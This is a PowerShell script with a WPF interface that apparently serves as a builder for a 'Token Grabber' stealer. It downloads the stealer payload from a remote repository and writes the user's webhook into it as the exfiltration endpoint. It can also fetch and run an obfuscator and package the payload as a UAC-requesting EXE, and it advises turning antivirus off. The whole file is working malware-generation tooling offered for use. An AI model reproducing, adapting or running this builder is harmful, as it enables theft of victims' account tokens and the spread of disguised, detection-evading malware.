Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$download_url = "https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main."

$wpf_code = @'
<Window x:Class="GUI_TEST.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d"
        Title="Powershell Token Grabber | K.Dot#4044" Height="500" Width="818" WindowStyle="ThreeDBorderWindow" ResizeMode="NoResize">
    <Window.Resources>
        <ResourceDictionary>
            <Style x:Key="CustomButtonStyle" TargetType="{x:Type Button}">
                <Setter Property="Template">
                    <Setter.Value>
                        <ControlTemplate TargetType="{x:Type Button}">
                            <Border BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}">
                                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                            </Border>
                            <ControlTemplate.Triggers>
                                <Trigger Property="IsMouseOver" Value="True">
                                </Trigger>
                            </ControlTemplate.Triggers>
                        </ControlTemplate>
                    </Setter.Value>
                </Setter>
            </Style>
        </ResourceDictionary>
    </Window.Resources>
    <Grid x:Name="Name_Thing" Background="#846DCF">
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="68*"/>
            <ColumnDefinition Width="341*"/>
        </Grid.ColumnDefinitions>
        <TextBox HorizontalAlignment="Left" Height="94" Margin="10,5,0,0" TextWrapping="Wrap" Text="Powershell Token Grabber Builder" VerticalAlignment="Top" Width="783" IsReadOnly="True" FontSize="18" BorderThickness="4,4,4,4" Background="Black" Foreground="White" IsHitTestVisible="False" Grid.ColumnSpan="2">
            <TextBox.BorderBrush>
                <SolidColorBrush Color="#FF1AFB00" Opacity="1"/>
            </TextBox.BorderBrush>
        </TextBox>
        <TextBox x:Name="OUTPUT_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="203" Margin="10,152,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="410" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.ColumnSpan="2"/>
        <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="47,119,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18" Grid.Column="1"/>
        <Button x:Name="Ps1_Button" Content="Build PS1" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="88" Margin="311,152,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Text Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1"/>
        <Button x:Name="Bat_Button" Content="Build BAT" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="87" Margin="311,247,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1"/>
        <Button x:Name="Exe_Button" Content="Build Exe" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="102" Margin="311,342,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1"/>
        <TextBox x:Name="WEBHOOK_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="53" Margin="10,391,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="348" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.ColumnSpan="2"/>
        <Label Content="ENTER WEBHOOK&#xD;&#xA;" HorizontalAlignment="Left" Height="28" Margin="121,358,0,0" VerticalAlignment="Top" Width="126" FontFamily="Impact" FontSize="18" Grid.ColumnSpan="2"/>
        <Button x:Name="CHECK_BUTTON" Grid.Column="1" Content="Check" HorizontalAlignment="Left" Height="53" Margin="227,391,0,0" VerticalAlignment="Top" Width="57" FontFamily="Impact" FontSize="18" Background="Black" Foreground="White"/>
    </Grid>
</Window>
'@

function Invoke-UI {
    $inputXML = $wpf_code -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path -replace 'logo.ico', $icon_name_path
    [XML]$XAML = $inputXML

    $reader = (New-Object System.Xml.XmlNodeReader $xaml)
    try {
        $window = [Windows.Markup.XamlReader]::Load( $reader )
    } catch {
        Write-Warning $_.Exception
        throw
    }

    $Window.add_Loaded({
        $Window.Icon = $icon_name_path
    })

    $xaml.SelectNodes("//*[@Name]") | ForEach-Object {
        try {
            Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction SilentlyContinue
        } catch {
            $null
        }
    }
    Get-Variable var_* > $null
    
    $var_ps1_button.add_Click({
        Invoke-PS1
    })
    
    $var_Bat_Button.add_Click({
        Invoke-BAT
    })

    $var_EXE_Button.add_Click({
        Invoke-EXE
    })
    
    $var_OUTPUT_BOX.add_TextChanged({
        $var_OUTPUT_BOX.ScrollToEnd()
    })

    $var_CHECK_BUTTON.add_Click({
        $webhook_box_text = $var_WEBHOOK_BOX.Text
        try {
            $output = Invoke-WebRequest -Uri $webhook_box_text -UseBasicParsing -TimeoutSec 5
        } catch {
            $var_OUTPUT_BOX.Text += "Webhook is invalid`n"
            return
        }
        if ($output.StatusCode -eq 200) {
            $var_OUTPUT_BOX.Text += "Webhook is valid`n"
        } else {
            $var_OUTPUT_BOX.Text += "Webhook is invalid`n"
        }
    })

    $var_OUTPUT_BOX.Text += "Successfully Started`nNote: You might have to turn your anti virus off for building.`n"
    $Null = $window.ShowDialog()
}

function Hide-Console {
    [Win32.AllocConsole]::Invoke()
    $consoleWindowPtr = [Win32.GetConsoleWindow]::Invoke()
    [Win32.ShowWindow]::Invoke($consoleWindowPtr, 0)
}

function Invoke-PS1 {
    $webhook_url = $var_WEBHOOK_BOX.Text
    $download_url=$download_url+"ps1"
    Invoke-WebRequest -Uri $download_url -OutFile "main.ps1" -UseBasicParsing
    #replace YOUR_WEBHOOK_HERE from main.ps1 with the new url
    (Get-Content "main.ps1").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.ps1"
    $var_OUTPUT_BOX.Text += "Successfully Built PS1`n"
}

function Invoke-BAT {
    $webhook_url = $var_WEBHOOK_BOX.Text
    $download_url=$download_url+"bat"
    Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
    (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.bat"
    $var_OUTPUT_BOX.Text += "Successfully Built BAT`n"
    $obfuscate_box = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
    if ($obfuscate_box -ne "Yes") {
        return
    }
    $var_OUTPUT_BOX.Text += "Obfuscating BAT`n"
    (New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')
    Expand-Archive -Path "somalifuscator.zip" -DestinationPath "somalifuscator"
    Remove-Item -Path "somalifuscator.zip"
    $var_OUTPUT_BOX.Text += "Successfully Downloaded Somalifuscator`n"
    $current_dir = Get-Location
    $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
    #call setup.bat
    & $somalifuscator_dir\setup.bat $current_dir\main.bat ultimate
    $var_OUTPUT_BOX.Text += "Successfully Obfuscated BAT`n"
}

function Invoke-EXE {
    $webhook_url = $var_WEBHOOK_BOX.Text
    $download_url=$download_url+"bat"
    Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
    (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.bat"
    $var_OUTPUT_BOX.Text += "Successfully Built BAT`n"
    $var_OUTPUT_BOX.Text += "Obfuscating BAT`n"
    (New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')
    Expand-Archive -Path "somalifuscator.zip" -DestinationPath "somalifuscator"
    Remove-Item -Path "somalifuscator.zip"
    $var_OUTPUT_BOX.Text += "Successfully Downloaded Somalifuscator`n"
    $current_dir = Get-Location
    $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
    Start-Process -FilePath "$somalifuscator_dir\setup.bat" -ArgumentList "$current_dir\main.bat ultimate" -Wait -NoNewWindow
    $var_OUTPUT_BOX.Text += "Successfully Obfuscated BAT`n"
    Remove-Item -Path $current_dir\main.bat -Force
    Rename-Item -Path $current_dir\main.bat.ultimate.bat -NewName "main.bat" -Force
    Set-Location $somalifuscator_dir
    Start-Process -FilePath "$somalifuscator_dir\setup.bat" -ArgumentList "$current_dir\main.bat exe --uac" -Wait -NoNewWindow
    Move-Item -Path $somalifuscator_dir\main.exe -Destination $current_dir -Force
    $var_OUTPUT_BOX.Text += "Successfully Built EXE`n"
    Remove-Item -Path $current_dir\main.bat -ErrorAction SilentlyContinue
    Remove-Item -Path $current_dir\main.bat.ultimate.bat -ErrorAction SilentlyContinue
}

try {
    $current_dir = Get-Location
    $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
    Remove-Item -Path $somalifuscator_dir -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    $null
}

Invoke-UI